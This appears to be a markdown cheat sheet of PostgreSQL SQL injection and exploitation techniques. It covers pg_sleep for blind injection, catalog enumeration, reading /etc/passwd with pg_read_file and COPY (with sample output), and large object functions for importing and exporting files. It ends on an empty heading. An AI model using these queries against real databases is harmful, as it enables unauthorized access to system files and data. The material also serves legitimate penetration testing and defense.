# PostgreSQL

#### Blind SQL Injection Payloads

- pg_sleep(X): makes the psql process sleep for X seconds.

#### Finding PSQL Version

- select version();
  
  ``` PSQL select version();```

  ``` PostgreSQL 12.1 on x86_64-apple-darwin18.7.0, compiled by Apple clang version 11.0.0 (clang-1100.0.33.16), 64-bit```


#### Psql Master tables - Finding the databases, tables and columns.

	- pg_tables: pg_tables provides access to useful information about each table in the database. 
	- pg_database: contains information about all the databases.
	- pg_catalog.pg_tables: contains information about the tables.

#### Psql read local files

- pg_read_file: 

``` select pg_read_file('/path/filename')```

```select pg_read_file('/etc/passwd')  (Ex: output)                                           
-----------------------------------------------------------------------------------------------------
 ##                                                                                                 +
 # User Database                                                                                    +
 #                                                                                                  +
 # Note that this file is consulted directly only when the system is running                        +
 # in single-user mode.  At other times this information is provided by                             +
 # Open Directory.                                                                                  +
 #                                                                                                  +
 # See the opendirectoryd(8) man page for additional information about
 ```
#### Psql Create Table

- ``create table <tablename>(column1 type, column2 type);``

```Ex: 
psqltest# create table filecontent(id serial, content VARCHAR(400));
```

#### PSQL COPY file into table

* Create a table with any tablename.
  Syntax: ``create table <tablename>(column1 columntype)``

* Copy content of file into the created table
  For ex: lets copy /etc/passwd into a table filecontent
  Syntax: ``copy filecontent from '/etc/passwd'; ``

#### Psql LargeObjects Exploitation

- PostgreSQL has a large object facility, which provides stream-style access to user data that is stored in a special large-object structure. 

The following psql largeobject functions are useful for our purpose: 

* lo_creat(): returns an empty Object Identifier (OID) of new empty large object.

* lo_create(<<OID>>): creates a large object with the provided OID.

* lo_unlink(<<OID>>): deletes a large object with the provided OID.

* lo_import('<</path/filename>>', <<OID>>): imports the provided filename into to the OID provided.

* lo_export(): export a column into filename.

#### Blind SQL - Extracting Postgresql version based on response status